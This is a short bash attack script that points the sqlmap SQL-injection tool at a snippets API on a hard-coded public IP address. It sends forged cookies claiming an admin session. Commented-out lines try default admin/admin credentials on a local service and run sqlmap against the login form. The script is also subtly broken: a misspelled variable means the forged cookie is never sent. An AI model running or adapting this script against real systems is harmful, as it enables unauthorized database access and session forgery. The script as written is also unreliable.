#!/bin/bash

echo "PLEASE COPY THIS SCRIPT IN THE DIRECTORY OF SQLMAP\n"

urlforsnippetadding="http://46.101.91.7/api/snippets?user_id=1&content=injected"
cookiesthatgetusin="logged_in=1; username=admin; user_id=1"                                                                                              
python sqlmap.py -u $urlforsnippetadding --cookie=$cookiesthatgetsusin

#sessidcookie=$(curl --data "username=admin&password=admin" http://127.0.0.1:25543/login -v --silent 2>&1 | (grep -o "PHPSESSID=.*;"))
#echo $sessidcookie
#python sqlmap.py -u "http://127.0.0.1:25543/login?username=admin&password=admin" --dbms=MySQL --level 3

exit 0;
